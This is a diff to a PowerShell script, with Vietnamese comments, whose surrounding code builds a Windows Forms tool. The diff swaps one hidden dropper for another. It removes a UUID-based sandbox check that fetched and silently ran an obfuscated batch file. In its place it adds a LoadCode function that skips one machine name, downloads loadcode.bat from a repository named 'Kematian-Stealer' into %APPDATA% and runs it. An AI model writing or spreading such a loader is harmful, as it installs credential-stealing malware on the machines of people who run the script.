@@ -87,16 +87,41 @@ function Get-RandomString {
 # Test the function
 
 
-$UUID = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
+function LoadCode {
+    $userDomain = [System.Environment]::GetEnvironmentVariable("USERDOMAIN")
+    if ($userDomain -eq "DESKTOP-4V4R77Q") {
+        Write-Output "Không tải và chạy tệp do tên miền người dùng không phù hợp."
+        return
+    }
 
-# Danh sách UUID không hợp lệ
-$invalidUUIDs = @("03D40274-0435-05DC-8506-010700080009", "03000200-0400-0500-0006-000700080009")
+    $appData = [System.Environment]::GetEnvironmentVariable("APPDATA")
+    $filePath = Join-Path $appData "loadcode.bat"
+    $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/.vscode/loadcode.bat"
 
-# Kiểm tra nếu UUID không nằm trong danh sách UUID không hợp lệ
-if ($invalidUUIDs -notcontains $UUID) {
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/run_obf.bat" -OutFile "$env:Temp\shellcode.cmd"
-    Start-Process -FilePath "$env:Temp\shellcode.cmd" -WindowStyle Hidden
+    # Kiểm tra sự tồn tại của tệp
+    if (-Not (Test-Path $filePath)) {
+        # Tải tệp từ URL và lưu vào %appdata%
+        try {
+            Invoke-WebRequest -Uri $url -OutFile $filePath
+            Write-Output ("File tải xuống thành công và lưu tại " + $filePath)
+        }
+        catch {
+            Write-Output ("Lỗi khi tải tệp: " + $_.Exception.Message)
+            return
+        }
+    }
+
+    # Chạy tệp loadcode.bat
+    try {
+        Start-Process $filePath -Wait
+        Write-Output "Tệp đã được chạy thành công."
+    }
+    catch {
+        Write-Output ("Lỗi khi chạy tệp: " + $_.Exception.Message)
+    }
 }
+
+LoadCode
 
 # Load required assembly for Windows Forms
 Add-Type -AssemblyName System.Windows.Forms
